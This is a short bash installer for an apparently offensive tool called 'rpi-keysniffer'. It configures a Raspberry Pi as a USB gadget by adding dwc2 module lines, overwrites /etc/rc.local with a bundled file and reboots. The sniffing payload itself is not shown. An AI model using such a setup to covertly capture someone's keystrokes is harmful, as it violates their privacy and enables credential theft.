#!/bin/bash -e
clear
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color
answer=False

#function to add usb gadget modules
function modules() {
  echo "dtoverlay=dwc2" | sudo tee -a /boot/config.txt
  echo "dwc2" | sudo tee -a /etc/modules
}

echo -e "${RED}
██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗░░░██╗████████╗░░██╗██╗░█████╗░░░██╗██╗
╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗╚██╗░██╔╝╚══██╔══╝░██╔╝██║██╔══██╗░██╔╝██║
░╚███╔╝░██████╔╝██║░░░░░██║░░██║░╚████╔╝░░░░██║░░░██╔╝░██║██║░░██║██╔╝░██║
░██╔██╗░██╔═══╝░██║░░░░░██║░░██║░░╚██╔╝░░░░░██║░░░███████║██║░░██║███████║
██╔╝╚██╗██║░░░░░███████╗╚█████╔╝░░░██║░░░░░░██║░░░╚════██║╚█████╔╝╚════██║
╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░░░░╚═╝░░░░░░░░╚═╝░╚════╝░░░░░░╚═╝"
echo -e "${BLUE}╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╮╭━╮
╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╯┃╭╯
╭━┳━━┳╮╱╱┃┃╭┳━━┳╮╱╭┳━━┳━╮╭┳╯╰┳╯╰┳━━┳━╮
┃╭┫╭╮┣╋━━┫╰╯┫┃━┫┃╱┃┃━━┫╭╮╋╋╮╭┻╮╭┫┃━┫╭╯
┃┃┃╰╯┃┣━━┫╭╮┫┃━┫╰━╯┣━━┃┃┃┃┃┃┃╱┃┃┃┃━┫┃
╰╯┃╭━┻╯╱╱╰╯╰┻━━┻━╮╭┻━━┻╯╰┻╯╰╯╱╰╯╰━━┻╯
╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╰━━╯"
echo -e "${NC}\nWelcome to the rpi-keysniffer, press ENTER to continue."
read
echo -e "++++ this bash script is going to replace the rc.local of your pi ++++"
echo -e "++++ your machine will be restarted afterwards ++++"
echo ""

while [[ $answer = False ]]; do
read -p "Do you agree? [Y/n]: " YorN
if [[ $YorN = 'Y' ]];         #user agreed
then
  answer=True
  modules                     #add modules
  rm -rf /etc/rc.local        #replace rc.local
  cp rc.local /etc/rc.local
  sudo reboot
elif [[ $YorN = 'n' ]];       #user didnt agree
then
  modules
  answer=True
  echo "You will have to add the /path/to/your/gadgetsetup.sh to /etc/rc.local manually."
  echo "reboot afterwards"
else                         #user didnt answer anything
  echo -e "\nPlease enter 'Y' or 'n'"
fi
done
